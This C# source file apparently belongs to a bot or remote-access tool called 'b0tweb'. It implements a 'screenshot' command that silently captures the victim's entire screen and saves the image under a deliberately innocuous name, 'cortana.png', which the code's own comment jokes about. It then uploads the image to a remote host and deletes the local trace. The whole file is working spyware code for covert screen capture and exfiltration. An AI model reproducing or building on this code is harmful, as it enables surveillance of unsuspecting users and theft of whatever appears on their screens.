using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace b0tweb.Commands
{
    class ScreenshotCommand : AbstractCommand
    {
        public override string Command => "screenshot";

        protected override string ExecuteCommand(string[] args)
        {
            // Get the bounds of the virtual screen
            int left = SystemInformation.VirtualScreen.Left;
            int top = SystemInformation.VirtualScreen.Top;
            int width = SystemInformation.VirtualScreen.Width;
            int height = SystemInformation.VirtualScreen.Height;

            // Totally not a shady name
            string path = FileHelper.GetTemporaryFilePath("cortana.png");

            // Create a new bitmap
            using (Bitmap bmp = new Bitmap(width, height))
            {
                // Get the graphics
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    // Copy the screen
                    g.CopyFromScreen(left, top, 0, 0, bmp.Size);
                }

                bmp.Save(path);
            }

            string url = HTTPHelper.Upload(path);
            FileHelper.DeleteFile(path);

            return url;
        }
    }
}
